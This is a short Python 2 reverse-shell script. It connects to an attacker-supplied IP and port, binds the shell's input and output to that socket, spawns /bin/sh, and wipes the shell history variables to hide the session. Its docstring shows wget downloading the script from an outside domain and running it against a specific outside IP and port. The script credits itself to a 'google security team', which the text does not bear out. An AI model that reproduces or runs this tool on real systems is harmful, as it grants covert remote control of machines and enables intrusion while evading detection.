# -*- coding:utf-8 -*-
#!/usr/bin/env python
"""
back connect py version,only linux have pty module
code by google security team
wget http://0ke.org/back.py -O /tmp/x.py
python /tmp/x.py 120.24.234.44 12588
"""
import sys,os,socket,pty
shell = "/bin/sh"
def usage(name):
    print 'python reverse connector'
    print 'usage: %s <ip_addr> <port>' % name

def main():
    if len(sys.argv) !=3:
        usage(sys.argv[0])
        sys.exit()
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((sys.argv[1],int(sys.argv[2])))
        print 'connect ok'
    except:
        print 'connect faild'
        sys.exit()
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    global shell
    os.unsetenv("HISTFILE")
    os.unsetenv("HISTFILESIZE")
    os.unsetenv("HISTSIZE")
    os.unsetenv("HISTORY")
    os.unsetenv("HISTSAVE")
    os.unsetenv("HISTZONE")
    os.unsetenv("HISTLOG")
    os.unsetenv("HISTCMD")
    os.putenv("HISTFILE",'/dev/null')
    os.putenv("HISTSIZE",'0')
    os.putenv("HISTFILESIZE",'0')
    pty.spawn(shell)
    s.close()

if __name__ == '__main__':
    main()
